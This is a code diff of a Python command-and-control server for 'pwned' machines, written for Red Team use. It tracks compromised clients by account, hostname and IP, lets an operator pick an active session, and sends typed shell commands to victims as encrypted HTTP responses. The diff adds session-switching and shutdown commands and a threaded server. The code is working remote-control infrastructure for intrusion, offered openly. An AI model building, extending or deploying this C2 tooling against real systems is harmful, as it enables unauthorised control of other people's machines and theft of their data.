@@ -2,58 +2,64 @@
 Command & Control Server Side Coding
 Author: Davood Yahay(D.Yakuza)
 """
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 # Custom Features Import
 from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from os import path, mkdir
-
-
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
                       BIND_ADDR, PORT, FILE_SEND, STORAGE)
 
 
-def get_new_session():
+def get_new_client():
     """Function to check if other sessions exist if none do Re-Initialize variables.
     However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
 
     # this variable must be global, as they will often be updated via multiple session
-    global activeSession, pwnedDict, pwnedId, cwd
+    global activeClient, pwnedDict, pwnedId, cwd
     # Delete Lost Connection Client from pwnedDict
-    del pwnedDict[activeSession]
+    # del pwnedDict[activeSession]
 
     # Reinitialize cwd to its starting value of tilde
     cwd = "~"
 
     # If pwnedDict is empty, Re initialize pwnedId & activeSession
-    if not pwnedDict:
-        print(Fore.LIGHTBLUE_EX+ "[...] Waiting for a new Connection!" + Fore.RESET)
+    if len(pwnedDict) == 1:
+        print(Fore.LIGHTBLUE_EX+ "\n[...] Waiting for a new Connection!. \n" + Fore.RESET)
+        pwnedDict = {}
         pwnedId = 0
-        activeSession = 1
+        activeClient = 1
+
     # if pwnedDict have items, print it on display to choose active session and switch to it
     else:
         #display sessions in our dictionary and choose one of them to switch over to
         while True:
-            print(*pwnedDict.items(), sep='\n')
+            for key, value in pwnedDict.items():
+                if key != activeClient:
+                    print(f"{Fore.LIGHTGREEN_EX}{key}{Fore.MAGENTA} - {Fore.LIGHTYELLOW_EX}{value}{Fore.RESET}")
+
             try:
-                newSession = int(input("\n[+] Choose Session Number to Make it Active => "))
+                newSession = int(input(f"{Fore.LIGHTGREEN_EX}\n[+] Choose Session Number "
+                                                          f"to Make it Active => {Fore.RESET}"))
             except ValueError:
                 print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
                                          "one of the sessions show on the Screen\n" + Fore.RESET)
                 continue
             # Ensure entered pwnedId exists in pwnedDict and set activeSession to it
-            if newSession in pwnedDict:
-                activeSession = newSession
-                print(Fore.LIGHTGREEN_EX + f"[+] Active Session has been Set on: "
-                                          f"{pwnedDict[activeSession]}\n" + Fore.RESET)
+            if newSession in pwnedDict and newSession != activeClient:
+                oldActiveSession = activeClient
+                activeClient = newSession
+                del pwnedDict[oldActiveSession]
+                print(Fore.LIGHTGREEN_EX + f"\n[+] Active Session is Now Set on: "
+                                          f"{pwnedDict[activeClient]} \n" + Fore.RESET)
                 break
             # if newSession not in pwnedDict actually wrong chosen number
             else:
-                print(Fore.LIGHTRED_EX + "\nWrong Choose; You must choose a pwned ID of one "
-                      "of the sessions show on the Screen\n")
+                print(Fore.LIGHTRED_EX + "\n[-] => Wrong Choice; You must choose One of the Pwned ID's "
+                      "you see on the Screen\n")
                 continue
 
 
@@ -70,7 +76,7 @@ class C2Handler(BaseHTTPRequestHandler):
         """this method handles all http GET Requests arrived at the C2 server.
         first send 404 status codes"""
         
-        global activeSession, clientAccount, clientHostname, pwnedId, pwnedDict, cwd
+        global activeClient, clientAccount, clientHostname, pwnedId, pwnedDict, cwd
         
         if self.path.startswith(CMD_REQUEST):
             # Split out the Client from http GET Request
@@ -104,7 +110,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 print(Fore.LIGHTGREEN_EX+f"[+] {clientAccount}@{clientHostname}({clientIp}) has been Pwned \n"+Fore.RESET)
             
             # If the client in pwnedDict and also is Active Session    
-            elif client == pwnedDict[activeSession]:
+            elif client == pwnedDict[activeClient]:
                 # if INPUT_TIMEOUT is set, run inputimeout instead of regular input
                 if INPUT_TIMEOUT:
                     try:
@@ -118,34 +124,75 @@ class C2Handler(BaseHTTPRequestHandler):
                         command = KEEP_ALIVE_CMD
                 else:
                     # Collect Command from regular input to run on the c2 client
-                    command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => "+Fore.LIGHTYELLOW_EX)
+                    command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd} "
+                                               f"=> "+Fore.LIGHTYELLOW_EX)
                     print(Fore.RESET)
 
-                # Send 200 status codes Write the Command back to the client as a Response; must use UTF-8 for encoding
-                try:
-                    # Send HTTP Response Code and Header back to the client
-                    self.http_response(200)
-                    
-                    # Write the Command back to the client as a Response; must use UTF-8 for encoding
-                    self.wfile.write(cipher.encrypt(command.encode()))
-                except BrokenPipeError:
-                    # Print lost connection message
-                    print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeSession]}. \n" + Fore.RESET)
-                    get_new_session()
-                # Handle KeyboardInterrupt
-                except KeyboardInterrupt:
-                    print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Server"+Fore.RESET)
-                    exit()
-                # Handle Unknown & Other Errors
-                except Exception as e:
-                    print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
-                    print(f'Error Content:\n{e}')
-                # else block for fixing client kill command for the down client
+                if command.startswith("server "):
+                    # The 'server show clients' commands will display pwned systems and our active session information
+                    if command.startswith("server show clients"):
+                        # Print pwned systems and active session information to our screen
+                        print(f"{Fore.LIGHTCYAN_EX}Available Pwned Machines:{Fore.RESET}")
+                        printLast = None
+                        for key, value in pwnedDict.items():
+                            if key == activeClient:
+                                printLast = str(key) + " - " + value
+                            else:
+                                print(f"{Fore.LIGHTGREEN_EX}{key}{Fore.MAGENTA} - "
+                                      f"{Fore.LIGHTYELLOW_EX}{value}{Fore.RESET}")
+                        print(f"\n{Fore.LIGHTCYAN_EX}Your Active Sessions: {Fore.RESET}",
+                              f"{Fore.LIGHTYELLOW_EX}{printLast}{Fore.RESET}\n", sep="\n")
+
+                    # The 'server control PWNED_ID' command allow us to change active session
+                    elif command.startswith("server control "):
+                        # Make sure the supplied pwnedId is Valid, and if so, make the Switch
+                        try:
+                            possibleActiveClient = int(command.split()[2])
+                            if possibleActiveClient in pwnedDict:
+                                activeClient = possibleActiveClient
+                                print(f"Waiting for {pwnedDict[activeClient]} to Wake up.")
+                            else:
+                                raise ValueError
+                        except (ValueError, IndexError):
+                            print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a Proper Pwned ID. \n"
+                                  f"{Fore.GREEN}[+] => {Fore.RESET}Use {Fore.LIGHTYELLOW_EX}server show clients "
+                                  f"{Fore.RESET}command to see Available PwnedID's\n")
+
+                    elif command.startswith("server exit"):
+                        # Shutting Down the C2 Server
+                        print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
+                                                 f"{Fore.BLUE} Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
+                        server.shutdown()
+
+                # Else Command is not a special,
+                # Write it on the Response File and then a client able to read it and run it
                 else:
-                    # If we have just killed a client, try to get a new session to set it active
-                    if command.startswith("client kill"):
-                        get_new_session()
-            
+                    # Send 200 status codes Write the Command back to the client as a Response;
+                    # must use UTF-8 for encoding
+                    try:
+                        # Send HTTP Response Code and Header back to the client
+                        self.http_response(200)
+
+                        # Write the Command back to the client as a Response; must use UTF-8 for encoding
+                        self.wfile.write(cipher.encrypt(command.encode()))
+                    except BrokenPipeError:
+                        # Print lost connection message
+                        print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeClient]}. \n" + Fore.RESET)
+                        get_new_client()
+                    # Handle KeyboardInterrupt  - Optional
+                    except KeyboardInterrupt:
+                        print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Server"+Fore.RESET)
+                        exit()
+                    # Handle Unknown & Other Errors - Optional
+                    except Exception as e:
+                        print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
+                        print(f'Error Content:\n{e}')
+                    # else block for fixing client kill command for the down client
+                    else:
+                        # If we have just killed a client, try to get a new session to set it active
+                        if command.startswith("client kill"):
+                            get_new_client()
+
             # if client in the pwnedDict but is Not Active Session
             else:
                 # Send HTTP Response Code and Header back to the client
@@ -275,7 +322,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
 
 # maps to the clients we have a prompt from that 
-activeSession = 1
+activeClient = 1
 
 # this is accounts from the client belonging to Active Sessions
 clientAccount = ""
@@ -300,9 +347,16 @@ cwd = "~"
 
 # Instance from HTTP Server
 # noinspection PyTypeChecker
-server = HTTPServer((BIND_ADDR, PORT), C2Handler)
+server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
 
 # Print C2 Server Side Message for avoid complexing in test operation
-print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Server Side-------------[+]\nWait for new Connection...\n"+Fore.RESET)
+print(Fore.LIGHTMAGENTA_EX+"\n[+]-------------C2 Server Side-------------[+]\nWait for C2 Client...\n"+Fore.RESET)
+
 #Run Server in infinity Loop
-server.serve_forever()
+try:
+    server.serve_forever()
+except KeyboardInterrupt:
+    print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n{Fore.BLUE} "
+                             f"Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
+    server.shutdown()
+
